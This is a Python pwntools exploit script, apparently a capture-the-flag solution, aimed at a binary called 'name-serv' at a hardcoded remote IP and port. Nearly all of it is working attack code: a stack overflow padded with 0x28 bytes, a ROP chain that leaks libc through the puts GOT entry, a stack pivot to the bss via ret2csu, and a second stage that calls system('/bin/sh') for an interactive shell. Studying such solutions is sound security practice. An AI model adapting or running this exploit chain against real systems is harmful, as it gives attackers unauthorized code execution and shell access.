#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./name-serv')
libc = ELF('./libc.so.6')
rop = ROP(exe)

host, port = "3.97.113.25", "9001"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

buff = exe.bss(0xc00) & 0xfffffffffffffff0			# a buffer on bss

# we dump puts got entry, then wait for a second rop payload that we put on bss, then pivot to it
rop.puts(exe.got['puts'])
rop.ret2csu(0,buff,0x100,call=exe.got['read'], rbp=(buff-8))
rop.call(rop.find_gadget(['leave','ret']))

p.sendlineafter('name: ', b'A'*0x28+rop.chain())

# receive puts got entry value, and calculate libc base with it
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00')) - 0x875a0
print('libc base = '+hex(libc.address))

# send a onegadget address as the rop second payload
rop2 = ROP(exe)
rop2.call(libc.symbols['system'], [buff+24])
rop2.raw(u64('/bin/sh\x00'))
p.send(rop2.chain())

# and we got shell
p.interactive()
